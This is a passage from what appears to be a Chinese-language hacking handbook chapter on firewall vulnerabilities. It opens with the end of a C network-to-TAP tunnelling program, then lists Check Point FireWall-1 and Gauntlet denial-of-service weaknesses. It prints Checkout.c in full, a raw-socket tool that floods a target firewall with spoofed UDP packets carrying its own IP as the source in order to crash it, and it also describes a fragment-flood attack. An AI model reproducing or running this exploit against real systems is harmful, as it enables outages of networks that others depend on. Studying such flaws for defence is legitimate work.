

```c
sock = socket(AF_INET, SOCK_STREAM, 0);
#elif UDP
sock = socket(AF_INET, SOCK_DGRAM, 0);
#endif

if (sock == -1) {
    perror("socket");
    exit(0);
}
printf("Opening network socket.\n");
if (!daemon) {
    if (connect(sock, &destaddr, sizeof(struct sockaddr_in)) == -1) {
        perror("connect");
        exit(0);
    }
    netfd = sock;
} else {
    struct sockaddr_in listenaddr;
#if UDP
    struct sockaddr_in remote;
#endif
    int socklen;

    listenaddr.sin_port = htons(destport);
    listenaddr.sin_family = AF_INET;
    listenaddr.sin_addr.s_addr = inet_addr("0.0.0.0");
    if (bind(sock, &listenaddr, sizeof(struct sockaddr_in)) == -1) {
        perror("bind");
        exit(0);
    }
    socklen = sizeof(struct sockaddr_in);
#if defined TCP
    if (listen(sock, 1) == -1) {
        perror("listen");
        exit(0);
    }
    printf("Waiting for TCP connection... \n");
    if ((netfd = accept(sock, &listenaddr, &socklen)) == -1) {
        perror("accept");
        exit(0);
    }
}
#else /* UDP */
    netfd = sock;
    recvfrom(netfd, buffer, BUFSIZE, MSG_PEEK, &remote, &socklen);
    connect(netfd, &remote, socklen);
#endif
}
```

printf ("Opening /dev/tap0\n");
tapfd = open ("/dev/tap0", O_RDWR);
if (tapfd == -1) {
    perror("tapfd");
    exit(0);
}
selectloop(netfd, tapfd);
return 0;
}

```c
void selectloop(int netfd, int tapfd) {
    fd_set rfds;
    int maxfd;
    int len;

    if (netfd > tapfd)
        maxfd = netfd;
    else
        maxfd = tapfd;

    while(1) {
        FD_ZERO(&rfds);
        FD_SET(netfd, &rfds);
        FD_SET(tapfd, &rfds);

        if(select(maxfd+1, &rfds, NULL, NULL, NULL) == -1) {
            perror("select");
            exit(0);
        }

        if (FD_ISSET(netfd, &rfds)) {
            FD_CLR(netfd, &rfds);
            if ((len = read(netfd, buffer, BUFSIZE)) < 1) {
                if (len == -1)
                    perror("read_netfd");
                printf("netfd died, quitting\n");
                close(tapfd);
                exit(0);
            }
            printf("%d bytes from network\n", len);
            write(tapfd, buffer, len);
            continue;
        }

        if (FD_ISSET(tapfd, &rfds)) {
            FD_CLR(tapfd, &rfds);
            if ((len = read(tapfd, buffer, BUFSIZE)) < 1) {
                if (len == -1)
                    perror("read_tapfd");
                printf("tapfd died, quitting\n");
                shutdown(netfd, 2);
                close(netfd);
                exit(0);
            }
            printf("%d bytes from interface\n", len);
            write(netfd, buffer, len);
            continue;
        }
    } /* end of looping */
}
```

## FireWall-1

Check Point Software Technologies Ltd. (www.checkpoint.com) 成立于 1993 年，是全球防火墙安全领域的领导者。Check Point 的安全开放平台（OPSEC）为与超过 250 家行业领先的合作伙伴提供的所谓“最佳单点解决方案”提供集成和互操作性框架。该公司网络安全产品线的核心 FireWall-1 是一套屡获殊荣的企业安全套件，集成了访问控制、认证、加密、网络地址转换、内容安全和审计功能。

## 局限性

### 完全拒绝服务攻击

- **概要：** 当防火墙检测到来自不同 MAC 地址但具有与其相同 IP 地址的数据包时，它会崩溃。
- **攻击状态：** 系统崩溃。
- **受影响版本：** 3x、4x
- **攻击方式：** 当防火墙检测到来自不同 MAC 地址但具有与其相同 IP 地址的数据包时，它会崩溃。根据黑客大师 lore 编写的 *Checkout.c* 程序，该程序只需向目标防火墙接口发送几个伪造的 UDP 数据包即可。

Checkout.c

```c
#define __BSD_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/ip_udp.h>

#define TRUE  1
#define FALSE 0
#define ERR   -1

typedef u_long          ip_t;
typedef long           sock_t;
typedef struct ip      iph_t;
typedef struct udphdr  udph_t;
typedef u_short        port_t;

#define IP_SIZE   (sizeof(iph_t))
#define UDP_SIZE  (sizeof(udph_t))
#define PSIZE     (IP_SIZE + UDP_SIZE)
#define IP_OFF    (0)
#define UDP_OFF   (IP_OFF + IP_SIZE)

void      usage               __P ((u_char *));
u_short   checksum            __P ((u_short *, int));

int main (int argc, char * * argv)
{
        iph_t victim;
        sock_t fd;
        iph_t * ip_ptr;
        udph_t * udp_ptr;
        u_char packet[PSIZE];
        u_char * yes = "1";
        struct sockaddr_in sa;
        port_t aport;
        u_long packets;

        if (argc < 3)
        {
                usage (argv[0]);
        }

        fprintf(stderr, "\n*** CheckPoint IP Firewall DoS\n");
        fprintf(stderr, "*** Bug discovered by: antipent <rtodd@antipentium.com>\n");
        fprintf(stderr, "*** Code by: lore <fiddler@antisocial.com>\n\n");

        if ((victim = inet_addr(argv[1])) == ERR)
        {
                fprintf(stderr, "Bad IP address '%s'\n", argv[1]);
                exit(EXIT_FAILURE);
        }
        else if (!(packets = atoi(argv[2])))
        {
                fprintf(stderr, "You should send at least 1 packet\n");
                exit(EXIT_FAILURE);
        }
        else if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == ERR)
        {
                fprintf(stderr, "Couldn't create raw socket: %s\n",
                strerror(errno));
                exit(EXIT_FAILURE);
        }
        else if ((setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &yes, 1)) == ERR)
        {
                fprintf (stderr, "Couldn't set socket options: %s\n", strerror(errno));
                exit (EXIT_FAILURE);
        }

        srand ((unsigned)time (NULL));

        if (argc > 3)
        {
                aport = htons (atoi (argv[3]));
        }
        else
        {
                aport = htons (rand() % 65535 + 1);
        }

        fprintf (stderr, "Sending packets: ");

        while (packets--)
        {
                memset (packet, 0, PSIZE);

                ip_ptr = (iph_t *) (packet + IP_OFF);
                udp_ptr = (udph_t *) (packet + UDP_OFF);

                ip_ptr->ip_hl = 5;
                ip_ptr->ip_v = 4;
                ip_ptr->ip_tos = 0;
                ip_ptr->ip_len = PSIZE;
                ip_ptr->ip_id = 1234;
                ip_ptr->ip_off = 0;
                ip_ptr->ip_ttl = 255;
                ip_ptr->ip_p = IPPROTO_UDP;
                ip_ptr->ip_sum = 0;
                ip_ptr->ip_src.s_addr = victim;
                ip_ptr->ip_dst.s_addr = victim;

                udp_ptr->source = htons (rand() % 65535 + 1);
                udp_ptr->dest = aport;
                udp_ptr->len = htons (UDP_SIZE);
                udp_ptr->check = checksum ((u_short *)ip_ptr, PSIZE);

                sa.sin_port = htons (aport);
                sa.sin_family = AF_INET;
                sa.sin_addr.s_addr = victim;

                if ((sendto (fd,
                packet,
                PSIZE,
                0,
                (struct sockaddr *)&sa,
                sizeof (struct sockaddr_in))) == ERR)
                {
                        fprintf(stderr, "Couldn't send packet: %s\n",
                               strerror(errno));
                        close(fd);
                        exit(EXIT_FAILURE);
                }
                fprintf(stderr, ".");
        }

        fprintf(stderr, "\n");
        close(fd);

        return (EXIT_SUCCESS);
}

void usage (u_char * pname)
{
        fprintf(stderr, "Usage: %s <victim_ip> <packets> [port]\n", pname);
        exit(EXIT_SUCCESS);
}

u_short checksum (u_short *addr, int len)
{
        register int nleft = len;
        register int sum = 0;
        u_short answer = 0;

        while (nleft > 1) {
                sum += *addr++;
                nleft -= 2;
        }

        if (nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)addr;
                sum += answer;
        }

        sum = (sum >> 16) + (sum + 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return(answer);
}

/* EOF */
```

### 严重拥塞

- **概要：** 此漏洞允许远程攻击者使防火墙陷入 100% CPU 利用率的锁死状态。
- **攻击状态：** 严重拥塞；系统崩溃。
- **受影响版本：** 所有版本。
- **攻击方式：** FW-1 不会检查或记录分片数据包，直到数据包完全重组为止。因此，远程攻击者可以通过向目标接口发送成千上万个无关的分片数据包，使系统无法运行。

## Gauntlet

毫无疑问，防火墙是最难以正确配置的安全防御机制。尽管大多数漏洞评估通常会发现防火墙配置中的缺陷，但 PGP Security（Network Associates 公司，www.pgp.com/asp_set/products/tns/gauntlet.asp）推出的 Gauntlet Firewall 的缺陷比大多数防火墙都要少。通过几乎完整的协议栈进行检查，Gauntlet 的代理模块利用 Network Associates 待授权的自适应代理技术，以数据包过滤的速度抵御未经授权的访问者。除了其他赞誉之外，Gauntlet 的配置管理软件模块 Firewall Manager 也获得了极佳的评价（见图 11.1）。

![](img/ba85bb40c695c02adae8cbd6666f2e0c_633_0.png)

**图 11.1** Gauntlet 防火墙管理器界面。

### 局限性

### 拒绝服务攻击

- **概要：** 此漏洞允许远程攻击者锁死防火墙。
- **攻击状态：** 系统崩溃。

